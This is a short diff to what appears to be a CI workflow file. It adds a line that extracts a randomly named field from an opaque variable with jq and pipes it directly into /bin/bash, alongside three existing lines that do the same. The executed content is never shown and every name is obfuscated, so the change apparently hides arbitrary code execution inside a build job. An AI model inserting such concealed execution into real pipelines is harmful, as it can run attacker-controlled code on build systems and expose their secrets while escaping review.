@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$yc3" | jq -r .tkzq857 | /bin/bash
           echo $elt490 | jq -r .dqohm2 | /bin/bash
           echo $lp36937 | jq -r .snt5861 | /bin/bash
+          printf '%s' "$krf7" | jq -r .d27794 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
